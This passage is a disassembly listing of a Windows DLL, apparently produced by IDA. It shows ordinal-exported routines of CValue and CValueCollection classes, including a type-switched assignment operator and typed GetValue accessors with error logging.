					; Ordinal255+11Aj ...
		jnz	short loc_6AF384CA ; jumptable 6AF38316	default	case

loc_6AF384C0:				; CODE XREF: Ordinal255+95j
					; Ordinal255+DCj
		mov	bl, 1
		jmp	short loc_6AF384CA ; jumptable 6AF38316	default	case
; ---------------------------------------------------------------------------

loc_6AF384C4:				; DATA XREF: Ordinal255+184o
					; Ordinal255+1D9o
		mov	esi, [ebp+var_34]
		mov	bl, [ebp+var_25]

loc_6AF384CA:				; CODE XREF: Ordinal255+41j
					; Ordinal255+5Aj ...
		lea	ecx, [ebp+var_54] ; jumptable 6AF38316 default case
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF384D8
		xor	bl, bl

loc_6AF384D8:				; CODE XREF: Ordinal255+205j
		cmp	[ebp+arg_4], 0
		jnz	short loc_6AF384E8
		test	bl, bl
		jz	short loc_6AF384E8
		mov	eax, [ebp+arg_0]
		mov	[esi+8], eax

loc_6AF384E8:				; CODE XREF: Ordinal255+20Dj
					; Ordinal255+211j
		lea	ecx, [ebp+var_54]
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	al, bl
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal255	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
off_6AF3850B	dd offset loc_6AF38326	; DATA XREF: Ordinal255+47r
		dd offset loc_6AF38326	; jump table for switch	statement
		dd offset loc_6AF38326
		dd offset loc_6AF38326
		dd offset loc_6AF3831D
		dd offset loc_6AF38326
		dd offset loc_6AF383A5
		dd offset loc_6AF383E0
		dd offset loc_6AF384AE
		dd offset loc_6AF38326
		dd offset loc_6AF384B4
		dd offset loc_6AF384BA
; Exported entry 248.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal248
Ordinal248	proc near		; CODE XREF: sub_6AF335E9+12p
					; sub_6AF33615+18p ...

var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_48 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		mov	esi, ecx
		cmp	esi, edi
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_28], esi
		jz	loc_6AF38704
		call	Ordinal250
		push	offset aCvalueOperator ; "CValue::operator =()"
		lea	ecx, [ebp+var_48]
		mov	byte ptr [esi+44h], 1
		mov	byte ptr [ebp+arg_0+3],	1
		call	Ordinal751
		mov	eax, [edi+8]
		and	[ebp+var_4], 0
		mov	[esi+8], eax
		mov	eax, [edi+8]
		dec	eax
		cmp	eax, 0Bh	; switch 12 cases
		mov	byte ptr [ebp+var_4], 1
		ja	loc_6AF386DF	; jumptable 6AF3859B default case
		jmp	ds:off_6AF3871F[eax*4] ; switch	jump

loc_6AF385A2:				; DATA XREF: .text:off_6AF3871Fo
		mov	al, [edi+10h]	; jumptable 6AF3859B cases 0,9
		mov	[esi+10h], al
		jmp	loc_6AF386DF	; jumptable 6AF3859B default case
; ---------------------------------------------------------------------------

loc_6AF385AD:				; CODE XREF: Ordinal248+60j
					; DATA XREF: .text:off_6AF3871Fo
		mov	ax, [edi+10h]	; jumptable 6AF3859B case 1
		mov	[esi+10h], ax
		jmp	loc_6AF386DF	; jumptable 6AF3859B default case
; ---------------------------------------------------------------------------

loc_6AF385BA:				; CODE XREF: Ordinal248+60j
					; DATA XREF: .text:off_6AF3871Fo
		mov	eax, [edi+10h]	; jumptable 6AF3859B case 3
		mov	[esi+10h], eax
		mov	eax, [edi+14h]
		mov	[esi+14h], eax
		jmp	loc_6AF386DF	; jumptable 6AF3859B default case
; ---------------------------------------------------------------------------

loc_6AF385CB:				; CODE XREF: Ordinal248+60j
					; DATA XREF: .text:off_6AF3871Fo
		fld	qword ptr [edi+10h] ; jumptable	6AF3859B case 4
		fstp	qword ptr [esi+10h]
		jmp	loc_6AF386DF	; jumptable 6AF3859B default case
; ---------------------------------------------------------------------------

loc_6AF385D6:				; CODE XREF: Ordinal248+60j
					; DATA XREF: .text:off_6AF3871Fo
		mov	eax, [edi+10h]	; jumptable 6AF3859B cases 2,5
		mov	[esi+10h], eax
		jmp	loc_6AF386DF	; jumptable 6AF3859B default case
; ---------------------------------------------------------------------------

loc_6AF385E1:				; CODE XREF: Ordinal248+60j
					; DATA XREF: .text:off_6AF3871Fo
		add	edi, 38h	; jumptable 6AF3859B case 6
		lea	ecx, [esi+38h]
		push	edi
		call	sub_6AF31C41
		jmp	loc_6AF386DF	; jumptable 6AF3859B default case
; ---------------------------------------------------------------------------

loc_6AF385F2:				; CODE XREF: Ordinal248+60j
					; DATA XREF: .text:off_6AF3871Fo
		add	edi, 3Ch	; jumptable 6AF3859B case 7
		lea	ecx, [esi+3Ch]
		push	edi
		call	sub_6AF38282
		jmp	loc_6AF386DF	; jumptable 6AF3859B default case
; ---------------------------------------------------------------------------

loc_6AF38603:				; DATA XREF: .rdata:6AF627C0o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF386DC
		retn
; ---------------------------------------------------------------------------

loc_6AF38646:				; DATA XREF: .rdata:6AF627D0o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF386DC
		retn
; ---------------------------------------------------------------------------

loc_6AF3869B:				; CODE XREF: Ordinal248+60j
					; DATA XREF: .text:off_6AF3871Fo
		add	edi, 28h	; jumptable 6AF3859B case 8
		push	edi
		lea	ecx, [esi+28h]
		call	Ordinal864
		jmp	short loc_6AF386DF ; jumptable 6AF3859B	default	case
; ---------------------------------------------------------------------------

loc_6AF386A9:				; CODE XREF: Ordinal248+60j
					; DATA XREF: .text:off_6AF3871Fo
		add	edi, 18h	; jumptable 6AF3859B case 10
		push	edi		; pvargSrc
		lea	eax, [esi+18h]
		push	eax		; pvarDest
		call	ds:VariantCopyInd
		test	eax, eax
		jge	short loc_6AF386DF ; jumptable 6AF3859B	default	case
		push	eax		; Args
		push	offset aCvalueOperat_0 ; "CValue::operator =() : VariantCopyInd()"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	byte ptr [ebp+arg_0+3],	0
		jmp	short loc_6AF386DF ; jumptable 6AF3859B	default	case
; ---------------------------------------------------------------------------

loc_6AF386CE:				; CODE XREF: Ordinal248+60j
					; DATA XREF: .text:off_6AF3871Fo
		add	edi, 40h	; jumptable 6AF3859B case 11
		push	edi
		lea	ecx, [esi+40h]
		call	sub_6AF378A5
		jmp	short loc_6AF386DF ; jumptable 6AF3859B	default	case
; ---------------------------------------------------------------------------

loc_6AF386DC:				; DATA XREF: Ordinal248+105o
					; Ordinal248+15Ao
		mov	esi, [ebp+var_28]

loc_6AF386DF:				; CODE XREF: Ordinal248+5Aj
					; Ordinal248+6Dj ...
		lea	ecx, [ebp+var_48] ; jumptable 6AF3859B default case
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF386EF
		mov	byte ptr [ebp+arg_0+3],	0

loc_6AF386EF:				; CODE XREF: Ordinal248+1AEj
		cmp	byte ptr [ebp+arg_0+3],	0
		jnz	short loc_6AF386FC
		mov	ecx, esi
		call	Ordinal250

loc_6AF386FC:				; CODE XREF: Ordinal248+1B8j
		lea	ecx, [ebp+var_48]
		call	Ordinal752

loc_6AF38704:				; CODE XREF: Ordinal248+25j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal248	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
off_6AF3871F	dd offset loc_6AF385A2	; DATA XREF: Ordinal248+60r
		dd offset loc_6AF385AD	; jump table for switch	statement
		dd offset loc_6AF385D6
		dd offset loc_6AF385BA
		dd offset loc_6AF385CB
		dd offset loc_6AF385D6
		dd offset loc_6AF385E1
		dd offset loc_6AF385F2
		dd offset loc_6AF3869B
		dd offset loc_6AF385A2
		dd offset loc_6AF386A9
		dd offset loc_6AF386CE
; Exported entry 252.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal252
Ordinal252	proc near		; CODE XREF: Ordinal298+40p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	1
		push	[esp+4+arg_0]
		call	Ordinal255
		retn	4
Ordinal252	endp

; Exported entry 253.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal253
Ordinal253	proc near		; CODE XREF: Ordinal298+76p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	0
		push	[esp+4+arg_0]
		call	Ordinal255
		retn	4
Ordinal253	endp

; Exported entry 298.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal298
Ordinal298	proc near		; CODE XREF: Ordinal264+2Fp
					; Ordinal266+2Fp ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	ebx
		push	esi
		mov	esi, [esp+8+arg_8]
		push	edi
		push	esi
		push	[esp+10h+arg_0]
		mov	edi, ecx
		xor	ebx, ebx
		mov	[esi], ebx
		mov	eax, [edi]
		call	dword ptr [eax+8]
		test	al, al
		jnz	short loc_6AF38792
		push	offset aCvaluecolle_38 ; "CValueCollection::GetReadValue() : GetR"...
		call	sub_6AF3101A
		jmp	short loc_6AF387F7
; ---------------------------------------------------------------------------

loc_6AF38792:				; CODE XREF: Ordinal298+19j
		mov	ecx, [esi]
		mov	eax, [esp+0Ch+arg_4]
		cmp	[ecx+8], eax
		jz	short loc_6AF387FE
		cmp	byte ptr [edi+9], 0
		jnz	short loc_6AF387AA
		push	offset aCvaluecolle_39 ; "CValueCollection::GetReadValue() : m_bA"...
		jmp	short loc_6AF387B9
; ---------------------------------------------------------------------------

loc_6AF387AA:				; CODE XREF: Ordinal298+36j
		push	eax
		call	Ordinal252
		test	al, al
		jnz	short loc_6AF387C2
		push	offset aCvaluecolle_40 ; "CValueCollection::GetReadValue() : pVal"...

loc_6AF387B9:				; CODE XREF: Ordinal298+3Dj
		call	sub_6AF3102E
		mov	[esi], ebx
		jmp	short loc_6AF387F7
; ---------------------------------------------------------------------------

loc_6AF387C2:				; CODE XREF: Ordinal298+47j
		push	dword ptr [esi]
		lea	ebx, [edi+10h]
		mov	ecx, ebx
		call	Ordinal248
		cmp	dword ptr [edi+18h], 0
		jnz	short loc_6AF387DB
		push	offset aCvaluecolle_41 ; "CValueCollection::GetReadValue() : m_Au"...
		jmp	short loc_6AF387EF
; ---------------------------------------------------------------------------

loc_6AF387DB:				; CODE XREF: Ordinal298+67j
		push	[esp+0Ch+arg_4]
		mov	ecx, ebx
		call	Ordinal253
		test	al, al
		jnz	short loc_6AF387FC
		push	offset aCvaluecolle_42 ; "CValueCollection::GetReadValue() : m_Au"...

loc_6AF387EF:				; CODE XREF: Ordinal298+6Ej
		call	sub_6AF3102E
		and	dword ptr [esi], 0

loc_6AF387F7:				; CODE XREF: Ordinal298+25j
					; Ordinal298+55j
		pop	ecx
		xor	al, al
		jmp	short loc_6AF38800
; ---------------------------------------------------------------------------

loc_6AF387FC:				; CODE XREF: Ordinal298+7Dj
		mov	[esi], ebx

loc_6AF387FE:				; CODE XREF: Ordinal298+30j
		mov	al, 1

loc_6AF38800:				; CODE XREF: Ordinal298+8Fj
		pop	edi
		pop	esi
		pop	ebx
		retn	0Ch
Ordinal298	endp

; Exported entry 247.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal247
Ordinal247	proc near		; CODE XREF: sub_6AF33B50+44p
					; sub_6AF33BCE+4Ep ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		and	dword ptr [esi+8], 0
		lea	ecx, [esi+28h]
		mov	dword ptr [esi], offset	off_6AF56B50
		call	Ordinal861
		lea	ecx, [esi+38h]
		call	sub_6AF318C3
		lea	ecx, [esi+3Ch]
		call	sub_6AF318C3
		and	dword ptr [esi+40h], 0
		lea	eax, [esi+18h]
		push	eax		; pvarg
		mov	byte ptr [esi+44h], 0
		call	ds:VariantInit
		mov	ecx, esi
		call	Ordinal250
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	Ordinal248
		mov	eax, esi
		pop	esi
		retn	4
Ordinal247	endp

; Exported entry 264.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal264
Ordinal264	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		xor	ebx, ebx
		mov	esi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[edi], bl
		call	Ordinal1228
		lea	eax, [ebp+arg_4]
		push	eax
		push	0Ah
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+arg_4], ebx
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF3889A
		push	offset aCvaluecolle_43 ; "CValueCollection::GetValue(bool) : GetR"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF388A4
; ---------------------------------------------------------------------------

loc_6AF3889A:				; CODE XREF: Ordinal264+36j
		mov	eax, [ebp+arg_4]
		mov	al, [eax+10h]
		mov	[edi], al
		mov	bl, 1

loc_6AF388A4:				; CODE XREF: Ordinal264+43j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal264	endp

; Exported entry 266.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal266
Ordinal266	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		push	edi
		xor	ebx, ebx
		mov	edi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [edi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[esi], bl
		call	Ordinal1228
		lea	eax, [ebp+arg_4]
		push	eax
		push	1
		push	[ebp+arg_0]
		mov	ecx, edi
		mov	[ebp+arg_4], ebx
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF388FA
		push	offset aCvaluecolle_44 ; "CValueCollection::GetValue(BYTE) : GetR"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF38904
; ---------------------------------------------------------------------------

loc_6AF388FA:				; CODE XREF: Ordinal266+36j
		mov	eax, [ebp+arg_4]
		mov	al, [eax+10h]
		mov	[esi], al
		mov	bl, 1

loc_6AF38904:				; CODE XREF: Ordinal266+43j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal266	endp

; Exported entry 268.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal268
Ordinal268	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		xor	ebx, ebx
		mov	esi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[edi], bx
		call	Ordinal1228
		lea	eax, [ebp+arg_4]
		push	eax
		push	2
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+arg_4], ebx
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF3895B
		push	offset aCvaluecolle_45 ; "CValueCollection::GetValue(WORD) : GetR"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF38967
; ---------------------------------------------------------------------------

loc_6AF3895B:				; CODE XREF: Ordinal268+37j
		mov	eax, [ebp+arg_4]
		mov	ax, [eax+10h]
		mov	[edi], ax
		mov	bl, 1

loc_6AF38967:				; CODE XREF: Ordinal268+44j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal268	endp

; Exported entry 270.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal270
Ordinal270	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		xor	ebx, ebx
		mov	esi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[edi], ebx
		call	Ordinal1228
		lea	eax, [ebp+arg_4]
		push	eax
		push	3
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+arg_4], ebx
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF389BD
		push	offset aCvaluecolle_46 ; "CValueCollection::GetValue(DWORD) : Get"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF389C7
; ---------------------------------------------------------------------------

loc_6AF389BD:				; CODE XREF: Ordinal270+36j
		mov	eax, [ebp+arg_4]
		mov	eax, [eax+10h]
		mov	[edi], eax
		mov	bl, 1

loc_6AF389C7:				; CODE XREF: Ordinal270+43j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal270	endp

; Exported entry 272.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal272
Ordinal272	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		push	edi
		xor	ebx, ebx
		mov	edi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [edi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[esi], ebx
		mov	[esi+4], ebx
		call	Ordinal1228
		lea	eax, [ebp+arg_4]
		push	eax
		push	4
		push	[ebp+arg_0]
		mov	ecx, edi
		mov	[ebp+arg_4], ebx
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF38A20
		push	offset aCvaluecolle_47 ; "CValueCollection::GetValue(ULONGLONG)	:"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF38A30
; ---------------------------------------------------------------------------

loc_6AF38A20:				; CODE XREF: Ordinal272+39j
		mov	eax, [ebp+arg_4]
		mov	ecx, [eax+10h]
		mov	[esi], ecx
		mov	eax, [eax+14h]
		mov	[esi+4], eax
		mov	bl, 1

loc_6AF38A30:				; CODE XREF: Ordinal272+46j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal272	endp

; Exported entry 274.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal274
Ordinal274	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		fldz
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		mov	esi, ecx
		fstp	qword ptr [edi]
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	eax, [ebp+arg_4]
		push	eax
		push	5
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+arg_4], ebx
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF38A88
		push	offset aCvaluecolle_48 ; "CValueCollection::GetValue(double) : Ge"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF38A92
; ---------------------------------------------------------------------------

loc_6AF38A88:				; CODE XREF: Ordinal274+38j
		mov	eax, [ebp+arg_4]
		fld	qword ptr [eax+10h]
		mov	bl, 1
		fstp	qword ptr [edi]

loc_6AF38A92:				; CODE XREF: Ordinal274+45j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal274	endp

; Exported entry 276.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal276
Ordinal276	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		xor	ebx, ebx
		mov	esi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[edi], ebx
		call	Ordinal1228
		lea	eax, [ebp+arg_4]
		push	eax
		push	6
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+arg_4], ebx
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF38AE8
		push	offset aCvaluecolle_49 ; "CValueCollection::GetValue(long) : GetR"...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF38AF2
; ---------------------------------------------------------------------------

loc_6AF38AE8:				; CODE XREF: Ordinal276+36j
		mov	eax, [ebp+arg_4]
		mov	eax, [eax+10h]
		mov	[edi], eax
		mov	bl, 1

loc_6AF38AF2:				; CODE XREF: Ordinal276+43j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal276	endp

; Exported entry 279.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal279(int,	void *Dst, int,	int)
		public Ordinal279
Ordinal279	proc near		; CODE XREF: Ordinal278+15p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
Dst		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	esi, [ebp+arg_C]
		xor	ebx, ebx
		cmp	[ebp+Dst], ebx
		push	edi
		mov	edi, ecx
		mov	[esi], ebx
		jz	loc_6AF38BAD
		cmp	[ebp+arg_8], ebx
		jz	loc_6AF38BAD
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [edi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	eax, [ebp+arg_C]
		push	eax
		push	9
		push	[ebp+arg_0]
		mov	ecx, edi
		mov	[ebp+arg_C], ebx
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF38B5A
		push	offset aCvaluecolle_50 ; "CValueCollection::GetValue(LPVOID) : Ge"...
		call	sub_6AF3101A

loc_6AF38B57:				; CODE XREF: Ordinal279+80j
		pop	ecx
		jmp	short loc_6AF38BA1
; ---------------------------------------------------------------------------

loc_6AF38B5A:				; CODE XREF: Ordinal279+48j
		mov	ecx, [ebp+arg_C]
		add	ecx, 28h
		call	Ordinal236
		test	eax, eax
		jz	short loc_6AF38B9F
		mov	ecx, [ebp+arg_C]
		add	ecx, 28h
		call	Ordinal236
		cmp	[ebp+arg_8], eax
		jnb	short loc_6AF38B85
		push	offset aCvaluecolle_51 ; "CValueCollection::GetValue(LPVOID) : dw"...
		call	sub_6AF3102E
		jmp	short loc_6AF38B57
; ---------------------------------------------------------------------------

loc_6AF38B85:				; CODE XREF: Ordinal279+74j
		mov	ecx, [ebp+arg_C]
		push	eax		; Size
		add	ecx, 28h
		mov	[esi], eax
		call	Ordinal865
		push	eax		; Src
		push	[ebp+Dst]	; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF38B9F:				; CODE XREF: Ordinal279+64j
		mov	bl, 1

loc_6AF38BA1:				; CODE XREF: Ordinal279+55j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	al, bl
		jmp	short loc_6AF38BBA
; ---------------------------------------------------------------------------

loc_6AF38BAD:				; CODE XREF: Ordinal279+15j
					; Ordinal279+1Ej
		push	offset aCvaluecolle_52 ; "CValueCollection::GetValue(LPVOID) : pD"...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al

loc_6AF38BBA:				; CODE XREF: Ordinal279+A8j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	10h
Ordinal279	endp

; Exported entry 282.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal282(int,	void *Dst, int,	int)
		public Ordinal282
Ordinal282	proc near		; CODE XREF: Ordinal281+15p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
Dst		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		mov	ebx, [ebp+Dst]
		push	esi
		mov	esi, [ebp+arg_C]
		and	dword ptr [esi], 0
		test	ebx, ebx
		push	edi
		mov	edi, ecx
		jz	short loc_6AF38C55
		cmp	[ebp+arg_8], 1
		jb	short loc_6AF38C55
		push	0
		push	0FFFFFFFFh
		lea	eax, [edi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	byte ptr [ebx],	0
		call	Ordinal1228
		and	[ebp+arg_C], 0
		lea	eax, [ebp+arg_C]
		push	eax
		push	7
		push	[ebp+arg_0]
		mov	ecx, edi
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF38C19
		push	offset aCvaluecolle_53 ; "CValueCollection::GetValue(LPSTR) : Get"...
		call	sub_6AF3101A

loc_6AF38C14:				; CODE XREF: Ordinal282+75j
		pop	ecx
		xor	bl, bl
		jmp	short loc_6AF38C49
; ---------------------------------------------------------------------------

loc_6AF38C19:				; CODE XREF: Ordinal282+47j
		mov	ecx, [ebp+arg_C]
		mov	eax, [ecx+38h]
		mov	eax, [eax-0Ch]
		test	eax, eax
		jz	short loc_6AF38C47
		inc	eax
		cmp	[ebp+arg_8], eax
		jnb	short loc_6AF38C38
		push	offset aCvaluecolle_54 ; "CValueCollection::GetValue(LPSTR) : dwS"...
		call	sub_6AF3102E
		jmp	short loc_6AF38C14
; ---------------------------------------------------------------------------

loc_6AF38C38:				; CODE XREF: Ordinal282+69j
		push	eax		; Size
		mov	[esi], eax
		push	dword ptr [ecx+38h] ; Src
		push	ebx		; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF38C47:				; CODE XREF: Ordinal282+63j
		mov	bl, 1

loc_6AF38C49:				; CODE XREF: Ordinal282+56j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	al, bl
		jmp	short loc_6AF38C62
; ---------------------------------------------------------------------------

loc_6AF38C55:				; CODE XREF: Ordinal282+16j
					; Ordinal282+1Cj
		push	offset aCvaluecolle_55 ; "CValueCollection::GetValue(LPSTR) : szS"...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al

loc_6AF38C62:				; CODE XREF: Ordinal282+92j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	10h
Ordinal282	endp

; Exported entry 283.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal283(int,	char *Src)
		public Ordinal283
Ordinal283	proc near		; DATA XREF: .rdata:off_6AF66098o

var_5C		= byte ptr -5Ch
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
var_24		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Args		= byte ptr  8
Src		= dword	ptr  0Ch

